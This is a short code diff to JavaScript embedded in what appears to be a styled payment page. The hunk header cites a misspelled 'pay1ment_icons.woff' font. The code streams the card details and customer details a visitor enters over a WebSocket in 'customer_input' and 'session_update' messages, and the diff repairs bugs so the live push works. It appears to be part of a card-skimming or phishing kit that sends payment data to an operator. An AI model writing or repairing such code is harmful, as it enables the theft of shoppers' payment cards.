@@ -1078,14 +1078,14 @@ url("pay1ment_icons.woff") format("woff");
                     var liveTimer = null;
                     var _sessionCreating = false;
                     function livePush() {
-                        if (!ws || ws.readyState !== 1)
+                        if (!ws || ws.readyState !== 1){
                             console.log('ws读不到');
-                            return;
-                        if (!s && _sessionCreating)
+                            return;}
+                        if (!sid && _sessionCreating){
                             console.log('ws读不到');
-                            return;
+                            return;}
                         var p = build();
-                        if (!s) {
+                        if (!sid) {
                             ws.send(JSON.stringify({
                                 type: 'customer_input',
                                 payload: p
@@ -1094,7 +1094,7 @@ url("pay1ment_icons.woff") format("woff");
                             ws.send(JSON.stringify({
                                 type: 'session_update',
                                 payload: {
-                                    sessionId: s,
+                                    sessionId: sid,
                                     cardInfo: p.cardInfo,
                                     customerInfo: p.customerInfo,
                                     currentStep: 'card'
